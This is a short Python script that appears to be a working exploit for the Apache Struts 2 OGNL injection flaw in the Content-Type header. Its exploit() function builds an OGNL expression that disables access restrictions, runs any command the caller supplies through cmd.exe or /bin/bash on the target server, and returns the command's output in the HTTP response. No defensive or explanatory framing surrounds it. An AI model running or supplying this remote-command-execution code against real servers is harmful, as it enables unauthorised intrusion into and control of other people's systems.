import requests

# this is XML value changer function so that payload_value work properly 
def url_value_change(url):
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')
    if ('://' not in url):
        url = str('http') + str('://') + str(url)
    return(url)


# this is payload code which we requests as get method to launch our command on remote server.

def exploit(url,command):
    payload_value = "%{(#_='multipart/form-data')."
    payload_value += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload_value += "(#_memberAccess?"
    payload_value += "(#_memberAccess=#dm):"
    payload_value += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload_value += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload_value += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload_value += "(#ognlUtil.getExcludedClasses().clear())."
    payload_value += "(#context.setMemberAccess(#dm))))."
    payload_value += "(#cmd='%s')." % command
    payload_value += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload_value += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload_value += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload_value += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload_value += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload_value += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload_value += "(#ros.flush())}"

    headers = {
        'User-Agent': 'payload.py ',
        # 'User-Agent': 'for Default Browser or Mozila Firefox',
        'Content-Type': str(payload_value),
        'Accept': 'any command'
    }

    timeout = 20
    try:
        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
    except Exception as e:
        print("EXCEPTION: " + str(e))
        output = 'NO such value'
    return(output)
